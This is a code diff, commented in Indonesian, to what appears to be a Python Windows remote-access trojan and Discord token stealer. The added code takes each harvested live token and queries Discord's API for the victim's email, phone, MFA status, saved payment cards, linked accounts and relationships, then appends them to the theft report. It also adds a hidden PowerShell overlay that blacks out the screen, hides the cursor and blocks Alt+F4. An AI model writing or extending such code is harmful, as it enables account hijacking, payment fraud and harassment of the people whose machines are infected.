@@ -19,6 +19,8 @@ import tempfile
 import threading
 import time
 
+from . import config
+
 CREATE_NO_WINDOW = 0x08000000
 k32 = ctypes.WinDLL("kernel32", use_last_error=True)
 u32 = ctypes.WinDLL("user32", use_last_error=True)
@@ -29,7 +31,7 @@ crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
 for _fn in (k32.LocalFree,):
     _fn.restype = ctypes.c_void_p
 
-_rick_proc = None
+_overlays = {}
 
 
 # ── AES-256 + GCM (murni Python) ─────────────────────────────────────────────
@@ -374,21 +376,85 @@ def _validate(token):
 
     Ini yang membuang kandidat palsu: string acak yang kebetulan berbentuk
     token tetap akan ditolak API, jadi yang dilaporkan hanya sesi nyata.
+    Return (nama, json user) atau (None, None).
     """
     try:
         import requests
-        r = requests.get("https://discord.com/api/v10/users/@me",
+        r = requests.get(config.API + "/users/@me",
                          headers={"Authorization": token,
                                   "User-Agent": "Mozilla/5.0"},
                          timeout=8)
         if r.status_code != 200:
-            return None
+            return None, None
         j = r.json()
         disc = j.get("discriminator") or "0"
         name = j.get("username") or "?"
-        return name if disc in ("0", "", None) else "%s#%s" % (name, disc)
+        who = name if disc in ("0", "", None) else "%s#%s" % (name, disc)
+        return who, j
     except Exception:
-        return None
+        return None, None
+
+
+def _mask_mail(mail):
+    if not mail or "@" not in mail:
+        return "-"
+    user, _, dom = mail.partition("@")
+    return "%s***@%s" % (user[:2], dom)
+
+
+def _mask_phone(phone):
+    if not phone:
+        return "-"
+    tail = phone[-4:]
+    return "***%s" % tail
+
+
+def _profile(token):
+    """Email, telepon, billing, dan akun terhubung dari token yang sudah valid.
+
+    Semua dipanggil dengan hak token itu sendiri, jadi tidak perlu admin dan
+    tidak perlu password. Yang ditampilkan dimask: email disisakan dua huruf,
+    telepon empat digit, kartu hanya brand + 4 digit terakhir.
+    """
+    import requests
+    hdr = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
+    out = []
+
+    def get(path):
+        try:
+            r = requests.get(config.API + path, headers=hdr, timeout=10)
+            return r.json() if r.status_code == 200 else None
+        except Exception:
+            return None
+
+    me = get("/users/@me") or {}
+    out.append("  email  : %s%s" % (_mask_mail(me.get("email")),
+                                   "" if me.get("verified") else " (belum verifikasi)"))
+    out.append("  telepon: %s   mfa=%s" % (_mask_phone(me.get("phone")),
+                                           "on" if me.get("mfa_enabled") else "off"))
+
+    pay = get("/users/@me/billing/payment-sources")
+    if isinstance(pay, list) and pay:
+        items = []
+        for p in pay:
+            brand = p.get("brand") or p.get("type") or "?"
+            last = p.get("last_4") or "----"
+            exp = "%02d/%02d" % (p.get("expires_month") or 0, (p.get("expires_year") or 0) % 100)
+            items.append("%s ****%s %s" % (brand, last, exp) if p.get("type") == 1 else str(brand))
+        out.append("  billing: %d  %s" % (len(pay), ", ".join(items)))
+    else:
+        out.append("  billing: 0")
+
+    conn = get("/users/@me/connections")
+    if isinstance(conn, list):
+        names = [c.get("type") or "?" for c in conn]
+        out.append("  kontak : %d terhubung%s" % (len(names),
+                                                  (" (" + ", ".join(names[:6]) + ")") if names else ""))
+
+    rel = get("/users/@me/relationships")
+    if isinstance(rel, list):
+        out.append("  relasi : %d" % len(rel))
+    return out
 
 
 def grab_tokens():
@@ -424,15 +490,20 @@ def grab_tokens():
                 for tok in _from_marker(blob, key):
                     add(tok)
 
-    valid = [(t, w) for t, w in ((t, _validate(t)) for t in cand) if w]
+    valid = []
+    for tok in cand:
+        who, _user = _validate(tok)
+        if who:
+            valid.append((tok, who))
 
     head = "GRAB mem=%s  file=%s" % (mem_stat, ", ".join(apps) or "-")
     if not valid:
         return (head + "\n0 token hidup — %d kandidat, semua ditolak API" % len(cand)
                 + "\nDiscord tidak jalan, atau belum login")
     lines = [head + "\n%d token hidup" % len(valid)]
-    for tok, who in valid:
+    for tok, who in valid[:3]:
         lines.append("%s...%s (%d char)  %s" % (tok[:10], tok[-6:], len(tok), who))
+        lines.extend(_profile(tok))
     return "\n".join(lines)
 
 
@@ -657,39 +728,78 @@ $f.Controls.Add($w)
 """
 
 
+def _overlay(key, script, label):
+    """Jalankan overlay PowerShell (rick / blackscreen), satu proses per key."""
+    old = _overlays.get(key)
+    if old is not None and old.poll() is None:
+        return "%s sudah jalan (pid %d) — %s off untuk tutup" % (label, old.pid, key)
+    path = os.path.join(tempfile.gettempdir(), "%s_%d.ps1" % (key, int(time.time())))
+    try:
+        with open(path, "w", encoding="utf-8") as fh:
+            fh.write(script)
+        proc = subprocess.Popen(
+            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-File", path],
+            creationflags=CREATE_NO_WINDOW)
+    except Exception as exc:
+        return "[err] %s" % exc
+    _overlays[key] = proc
+    return "%s pid=%d (%s off untuk tutup)" % (label, proc.pid, key)
+
+
+def _overlay_off(key, label):
+    proc = _overlays.pop(key, None)
+    if proc is None or proc.poll() is not None:
+        return "%s tidak jalan" % label
+    try:
+        subprocess.run(["taskkill", "/PID", str(proc.pid), "/T", "/F"],
+                       capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
+    except Exception:
+        pass
+    return "%s off" % label
+
+
 def rick(url=None):
     """Layar penuh, topmost, tanpa tombol tutup. Backend-nya WebBrowser (IE).
 
     Artinya YouTube biasanya TIDAK jalan; yang main adalah URL yang IE bisa
     buka, misalnya file .mp4 langsung.
     """
-    global _rick_proc
     url = url or "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"
-    script = RICK_PS % url.replace("'", "''")
-    path = os.path.join(tempfile.gettempdir(), "rk_%d.ps1" % int(time.time()))
-    with open(path, "w", encoding="utf-8") as fh:
-        fh.write(script)
-    try:
-        _rick_proc = subprocess.Popen(
-            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-File", path],
-            creationflags=CREATE_NO_WINDOW)
-        return "RICK pid=%d (rick off untuk tutup)" % _rick_proc.pid
-    except Exception as exc:
-        return "[err] %s" % exc
+    return _overlay("rick", RICK_PS % url.replace("'", "''"), "RICK")
 
 
 def rick_off():
-    global _rick_proc
-    if _rick_proc is None or _rick_proc.poll() is not None:
-        _rick_proc = None
-        return "RICK tidak jalan"
-    try:
-        subprocess.run(["taskkill", "/PID", str(_rick_proc.pid), "/T", "/F"],
-                       capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
-    except Exception:
-        pass
-    _rick_proc = None
-    return "RICK off"
+    return _overlay_off("rick", "RICK")
+
+
+BLACK_PS = r"""
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$f = New-Object System.Windows.Forms.Form
+$f.FormBorderStyle = 'None'
+$f.WindowState = 'Maximized'
+$f.TopMost = $true
+$f.BackColor = 'Black'
+$f.ShowInTaskbar = $false
+$f.Add_Shown({ [System.Windows.Forms.Cursor]::Hide() })
+# Kursor muncul lagi tiap kali bergerak, jadi disembunyikan ulang di sini.
+$f.Add_MouseMove({ [System.Windows.Forms.Cursor]::Hide() })
+# Alt+F4 jangan bisa nutup; satu-satunya jalan keluar `blackscreen off`.
+$f.Add_FormClosing({ $_.Cancel = $true })
+[System.Windows.Forms.Application]::Run($f)
+"""
+
+
+def blackscreen(on):
+    """Layar hitam penuh + kursor hilang.
+
+    Beda dari `block`: ini tidak butuh admin karena cuma jendela sendiri yang
+    menutupi layar, bukan memblokir input sistem. Keyboard tetap hidup, tapi
+    yang terlihat cuma hitam.
+    """
+    if not on:
+        return _overlay_off("black", "BLACK")
+    return _overlay("black", BLACK_PS, "BLACK")
 
 
 def bsod():
